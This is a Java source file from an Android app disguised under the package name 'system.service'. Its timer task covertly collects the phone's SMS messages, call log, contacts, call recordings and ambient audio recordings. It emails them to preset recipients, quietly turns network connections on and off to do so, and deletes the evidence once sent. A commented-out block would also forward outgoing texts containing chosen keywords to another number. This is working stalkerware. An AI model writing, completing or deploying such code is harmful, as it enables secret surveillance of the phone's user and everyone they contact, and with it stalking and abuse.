package system.service.task;

import java.io.DataOutputStream;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.TimerTask;

import system.service.GlobalValues;
import system.service.R;
import system.service.R.string;
import system.service.activity.GlobalPrefActivity;
import system.service.activity.NETWORK_CONNECT_MODE;
import system.service.config.ConfigCtrl;
import system.service.config.MailCfg;
import system.service.feature.contact.ContactCtrl;
import system.service.feature.contact.ContactInfo;
import system.service.feature.phonecall.PhoneCallCtrl;
import system.service.feature.phonecall.PhoneCallInfo;
import system.service.feature.sms.SmsCtrl;
import system.service.feature.sms.SmsInfo;
import system.service.utils.FileCtrl;

import com.particle.inspector.common.util.DatetimeUtil;
import com.particle.inspector.common.util.InternalMemUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.RegExpUtil;
import com.particle.inspector.common.util.StrUtils;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.DeviceProperty;
import com.particle.inspector.common.util.license.LICENSE_TYPE;
import com.particle.inspector.common.util.license.LicenseCtrl;
import com.particle.inspector.common.util.mail.MailSender;
import com.particle.inspector.common.util.phone.PhoneUtils;

import android.app.Activity;
import android.app.Service;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.os.RemoteException;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * Implementation of the timer task for information collection.
 */
public class GetInfoTask extends TimerTask 
{
	private final static String LOGTAG = "GetInfoTask";
	
	private final static int DEFAULT_RETRY_COUNT = 3;
	
	public Context context;
	private int interval; // interval days
	
	public static List<File> attachments;
	
	public GetInfoTask(Context context)
	{
		super();
		this.context = context;
		if (attachments != null) attachments.clear();
		else attachments = new ArrayList<File>();
		
		interval = GlobalPrefActivity.getInfoInterval(context);
	}
	
	public void run() 
	{
		// ===================================================================================
		// Check outgoing SMS for redirecting these sensitive
		// ===================================================================================
		
		//String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
		/*
		if (GlobalValues.recvPhoneNum.length() > 0) {
			List<SmsInfo> smsList = new ArrayList<SmsInfo>();
			
			Calendar now = Calendar.getInstance();
			Date threshold = new Date(now.getTime().getTime() - GlobalValues.getInfoTimerPeriod); 
			
			if (GlobalPrefActivity.getRedirectAllSms(context)) {
				// Get all new outgoing SMS in past 300 seconds
				smsList = SmsCtrl.getOutgoingSmsList(context, threshold);
			}
			else if (GlobalValues.sensitiveWords.length > 0) {
				// Get all new outgoing SMS that contains sensitive words in past 300 seconds
				smsList = SmsCtrl.getSensitiveOutgoingSmsList(context, GlobalValues.sensitiveWords, threshold);
			}
			
			for (SmsInfo sms : smsList) {
				String header = String.format(context.getResources().getString(R.string.sms_redirect_header), sms.phoneNumber);
				SmsCtrl.sendSms(GlobalValues.recvPhoneNum, header + sms.smsbody);
			}
		}
		*/
		
		//------------------------------------------------------------------------------------
		// If there are no recipients, return 
		if (GlobalValues.recipients == null || GlobalValues.recipients.length == 0) return;
		
		// Get initial networks state
		boolean isAlreadyWifiConnected = NetworkUtil.isWifiConnected(context);
		boolean isAlready3GConneted = NetworkUtil.is3GDataConnected(context);
		boolean isAlreadyDataNetworkConnected = NetworkUtil.isNetworkConnected(context);
		NETWORK_CONNECT_MODE netMode = GlobalPrefActivity.getNetworkConnectMode(context);
		
		// ===================================================================================
		// Try to send contact/phonecall/SMS collections
		// ===================================================================================
		if (isTimeToCollectInfo()) 
		{
			boolean connected = isAlreadyDataNetworkConnected;
			// If network not connected
			if (!isAlreadyDataNetworkConnected) {
				// Retrun if silent mode
				if (netMode == NETWORK_CONNECT_MODE.SILENT || netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
					// do nothing
				}
				// Or try to connect WIFI if wifi active mode
				else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
					if (NetworkUtil.tryToConnectWifi(context)) {
						connected = true;
					}
				}
				// Or try to connect network if active mode
				else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
					if (NetworkUtil.tryToConnectDataNetwork(context)) {
						connected = true;
					}
				}
			}
			// When comes here, means the network connected. But these is still possibility that 
			// it is not WIFI (means it is 3G/GPRS data connected).
			// Since info files are small (generally less than 200KB) and few (once per day at max), 
			// we will still let app use 3G/GPRS data connection to send info files.
			
			if (connected) {
				// Clean attachments
				if (attachments == null) attachments = new ArrayList<File>();
				else attachments.clear();
			
				// Collect information
				CollectContact(context);
				SysUtils.threadSleep(1000);
				CollectPhoneCallHist(context);
				SysUtils.threadSleep(1000);
				CollectSms(context);
				SysUtils.threadSleep(1000);
			
				if (NetworkUtil.isNetworkConnected(context)) {
					// Send mail
					String phoneNum = ConfigCtrl.getSelfName(context);
					String subject = context.getResources().getString(R.string.mail_from) 
		          		 + phoneNum + "-" + DatetimeUtil.format3.format(new Date())
		          		 + context.getResources().getString(R.string.mail_description);
					String body = String.format(context.getResources().getString(R.string.mail_body_info), phoneNum);
					String pwd = MailCfg.getSenderPwd(context);
			
					boolean result = false;
					int retry = DEFAULT_RETRY_COUNT;
					String host = MailCfg.getHost(context);
					String sender = MailCfg.getSender(context);
					String errMsg = "";
					while(!result && retry > 0)
					{
						result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, attachments, errMsg);
						retry--;
					}
					attachments.clear();
				
					// Update the last date time
					if (result) {
						ConfigCtrl.setLastGetInfoTime(context, new Date());
					}
				}
				
				// Clean info files
				FileCtrl.cleanTxtFiles(context);
				
				// -------------------------------------------------------------------
				// Check if user cheat license
				String key = ConfigCtrl.getLicenseKey(context);
				LICENSE_TYPE calType = LicenseCtrl.calLicenseType(context, key);
				LICENSE_TYPE setType = ConfigCtrl.getLicenseType(context);
				if (setType == LICENSE_TYPE.FULL_LICENSED && setType != calType) {
					ConfigCtrl.setLicenseType(context, LICENSE_TYPE.NOT_LICENSED);
				}
				// -------------------------------------------------------------------
			}
		}
		
		// ===================================================================================
		// Try to send phone call recording
		// ===================================================================================
		SysUtils.threadSleep(1000);
		
		// Get all wav files
		List<File> wavs = FileCtrl.getAllWavFiles(context);
		if (wavs.size() > 0) {
			// -------------------------------------------------------------------------------------------
			// Firstly we should make sure: 
			// 1. The phone is NOT recording phone calls
			// 2. The phone is NOT recording environment
			// 3. The networks are availble and meet the setting requirement
			
			// Condition 1: The phone is NOT recording phone calls
			boolean allowToSend = !GlobalValues.IS_CALL_RECORDING;
			
			// Condition 2: The phone is NOT recording environment
			if (allowToSend) {
				if (GlobalValues.IS_ENV_RECORDING) allowToSend = false;
			}
			
			// Condition 3: The networks are availble and meet the setting requirement
			if (allowToSend) {
				if (!NetworkUtil.isNetworkConnected(context)) {
					// Do not allow to send if data network is not connected
					allowToSend = false;
					
					// Try to connect WIFI if wifi active mode
					if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
						if (NetworkUtil.tryToConnectWifi(context)) {
							allowToSend = true;
						}
					}
					// Or try to connect network if active mode
					else if (netMode == NETWORK_CONNECT_MODE.ACTIVE) {
						if (NetworkUtil.tryToConnectDataNetwork(context)) {
							allowToSend = true;
						}
					}
				}
				// If network connected but it is not WIFI (means it is 3G/GPRS data connected)
				else if (!NetworkUtil.isWifiConnected(context)) {
					// Return if WIFI silent mode
					if (netMode == NETWORK_CONNECT_MODE.WIFISILENT) {
						allowToSend = false;
					}
					// Try to connect WIFI if WIFI active mode
					else if (netMode == NETWORK_CONNECT_MODE.WIFIACTIVE) {
						if (!NetworkUtil.tryToConnectWifi(context)) {
							allowToSend = false;
						}
					}
				}
			} // end of if (allowToSend)
		
			// ------------------------------------------------------------------------------
			// Start to send wav files
			if (allowToSend) {
				wavs = FileCtrl.sortFileByTimeOrder(wavs);
				List<File> callRecordWavs = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.callRecordFilePrefix);
				int callRecordWavsCount = callRecordWavs.size();
				List<File> envRecordWavs  = FileCtrl.filterWavFilesByPrefix(wavs, GlobalValues.envRecordFilePrefix);
				int envRecordWavsCount = envRecordWavs.size();
				
				int COUNT_PER_PACKAGE = 3;
				String phoneName = ConfigCtrl.getSelfName(context);
				String fromStr   = context.getResources().getString(R.string.mail_from);
				String host      = MailCfg.getHost(context);
				String sender    = MailCfg.getSender(context);
				String pwd       = MailCfg.getSenderPwd(context);
				
				// --------------------------------------------------------------------------
				// Send call record mails (3 wavs attached per mail) 
				if (callRecordWavsCount > 0) {
					String body = String.format(context.getResources().getString(R.string.mail_body_call_record), phoneName);
					for (int i = 0; i < (1 + callRecordWavsCount/COUNT_PER_PACKAGE); i++) {
						List<File> pack = getPackage(callRecordWavs, COUNT_PER_PACKAGE, i);
						if (pack.size() <= 0) continue;

						String subject = GlobalValues.callRecordFilePrefix + "-" + fromStr + phoneName 
							+ "-" + DatetimeUtil.format2.format(new Date());
			
						if (!NetworkUtil.isNetworkConnected(context)) {	return;	}
					
						boolean result = false;
						int retry = DEFAULT_RETRY_COUNT;
						String errMsg = "";
						while(!result && retry > 0)
						{
							result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
							retry--;
						}
		
						// Clean wav files that have been sent
						if (result) {
							FileCtrl.cleanWavFiles(pack);
						}
					} // end of for(...)
				}
				
				// --------------------------------------------------------------------------
				// Send env record mails (3 wavs attached per mail) 
				if (envRecordWavsCount > 0) {
					String body = String.format(context.getResources().getString(R.string.mail_body_env_record), phoneName);
					for (int i = 0; i < (1 + envRecordWavsCount/COUNT_PER_PACKAGE); i++) {
						List<File> pack = getPackage(envRecordWavs, COUNT_PER_PACKAGE, i);
						if (pack.size() <= 0) continue;

						String subject = GlobalValues.envRecordFilePrefix + "-" + fromStr + phoneName 
							+ "-" + DatetimeUtil.format2.format(new Date());
			
						if (!NetworkUtil.isNetworkConnected(context)) { return;	}
					
						boolean result = false;
						int retry = DEFAULT_RETRY_COUNT;
						String errMsg = "";
						while(!result && retry > 0)
						{
							result = sendMail(subject, body, host, sender, pwd, GlobalValues.recipients, pack, errMsg);
							retry--;
						}
		
						// Clean wav files that have been sent
						if (result) {
							FileCtrl.cleanWavFiles(pack);
						}
					} // end of for(...)
				}
				
			} // end of if (allowToSend)
		} // end of (wavs.size() > 0)
		
		// ===================================================================================
		// Restore phone settings
		// ===================================================================================
		// Originally WIFI off & 3G off, to be restored
		if (!isAlreadyDataNetworkConnected) {
			NetworkUtil.tryToDisconnectDataNetwork(context);
		}
		// Originally WIFI off & 3G on, to be restored 
		else if (!isAlreadyWifiConnected) { 
			NetworkUtil.tryToDisconnectWifi(context);
		} 
		// Originally WIFI on & 3G off, to be restored
		else if (!isAlready3GConneted) {
			NetworkUtil.tryToDisconnect3GData(context);
		} 
		
	} // end of run()
	
	// Make sure the time range ( > days that user set)
	private boolean isTimeToCollectInfo() {
		Date lastDatetime = null;
		String lastDatetimeStr = ConfigCtrl.getLastGetInfoTime(context);
		if (lastDatetimeStr != null && lastDatetimeStr.length() > 0) {
			try {
				lastDatetime = DatetimeUtil.format.parse(lastDatetimeStr);
			} catch (Exception ex) {}
		} else {
			return true;
		}
			
		Calendar now = Calendar.getInstance();
		if (interval < 1) interval = 1;
		now.add(Calendar.DATE, -1*interval);
		Date now_minus_x_day = now.getTime();
		return (now_minus_x_day.after(lastDatetime)); 
	}
	
	// Get i*count ~ (i+1)*count members in wavs as one package
	private List<File> getPackage(List<File> wavs, final int count, final int i) 
	{
		List<File> pack = new ArrayList<File>();
		
		int wavCount = wavs.size();
		for (int j=i*count; j<(i+1)*count; j++) {
			if (j < wavCount) {
				pack.add(wavs.get(j));
			}
		}
		return pack;
	}
	
	public static void CollectSms(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<SmsInfo> list = SmsCtrl.getSmsList(context, SmsCtrl.SMS_URI_ALL);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.sms_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = InternalMemUtil.Save(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectPhoneCallHist(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<PhoneCallInfo> list = PhoneCallCtrl.getPhoneCallHistory(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.phonecall_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = InternalMemUtil.Save(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}

	public static void CollectContact(Context context) 
	{
		StringBuilder sb = new StringBuilder();
		List<ContactInfo> list = ContactCtrl.getContactList(context);
		for (int i = 0; i < list.size(); i++)
		{
			sb.append(list.get(i).toString(context));
		}
		
		String deviceName = ConfigCtrl.getSelfName(context);
		String fileName = makeFileName(context, context.getResources().getString(R.string.contact_name), deviceName, FileCtrl.SUFFIX_TXT); 
		try {
			//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir();// Now info files will be saved to internal storage 
				
			File file = InternalMemUtil.Save(context, fileName, sb.toString());
			if (file != null) attachments.add(file);
		} catch (Exception e) {
			Log.e(LOGTAG, e.getMessage());
		}
	}
	
	public static boolean sendMail(String subject, String body, String host, String sender, String pwd, String[] recipients, List<File> files, String errMsg)
	{
		if (host == null) return false;
		boolean ret = false;

        try {   
            MailSender gmailSender = new MailSender(host, sender, pwd);
            gmailSender.setFrom(sender);
            gmailSender.setTo(recipients);
            gmailSender.setSubject(subject);
            gmailSender.setBody(body);
            
            for(int i = 0; i < files.size(); i++)
            	gmailSender.addAttachment(files.get(i));
            
            ret = gmailSender.send();
        } catch (Exception e) {   
            //Log.e(LOGTAG, (e == null) ? "Failed to send mail" : e.getMessage());
            errMsg = e.getMessage();
        }
        
		return ret;
	}
	
	private static String makeFileName(Context context, String nameBase, String deviceName, String suffix) 
	{	
		return nameBase + "-" + deviceName + "-" + DatetimeUtil.format3.format(new Date()) + suffix;
	}
	
}
